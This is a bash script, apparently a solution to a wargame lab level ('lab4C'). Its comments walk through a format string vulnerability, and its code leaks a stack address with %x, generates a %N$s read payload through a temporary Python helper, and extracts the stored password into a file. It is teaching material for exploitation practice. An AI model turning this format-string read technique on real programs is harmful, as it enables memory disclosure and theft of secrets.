#!/bin/bash

# Looking at the disassembled program, we can spot some interesting details about this program:
#
#   - The format string vulnerability is at the end, when the program prints the username string
#   - The address of the username buffer is at [esp+0x94]
#   - The address of the password string is at [esp+0x76]
#   - The address of the password buffer is at [esp+0x12]
#   - [esp+0x12] is also in [esp+0x4] at the moment of the vulnerability

# The last observation we made before can lead us to a valid stack address for the password string
# since the address [esp+0x12] is placed as the first argument of printf ([esp+0x4]) we can just
# print it with help of the %x format

esp12=$((python -c 'print "%08x\n"' | /levels/lab04/lab4C) | tail -n 1 | cut -d" " -f1)

# Then add it 100 bytes (0x76-0x12) to match the password string address
pass=$(python -c 'import sys; print int(sys.argv[1], 16)+100' $esp12)

# Lets write a simple script to make the format exploit more simple

cat > /tmp/.formatit.py <<EOF

import struct
import sys

# The usage is simple: python /tmp/formatit.py <offset> <address>

offset  = int(sys.argv[1], 0)
address = int(sys.argv[2], 0)

# in case that the offset of the buffer is not alligned we have to insert some padding
pad = "X"*(offset%4)

print "%%%d\$s"%((offset+3) / 4)
print "%s"%(pad+struct.pack("<I", address))

EOF

# The previous script just computes our format string exploit.
# First, specifies the format for printf(), in this case we are going to read from a memory address.
# Then prepares this address with some padding (if needed) to align it in memory
# The format expression is passed to the first buffer (username) and the password address along with the padding
# to the password buffer

# Now we can use our script to build our format string exploit and read the password
passfile=/tmp/lab4C.pass

echo "$(python /tmp/.formatit.py "0x12" $pass | /levels/lab04/lab4C | tail -n1 | cut -d" " -f1) > $passfile
echo Password stored in $passfile

# Clean-up
rm -f /tmp/.formatit.py
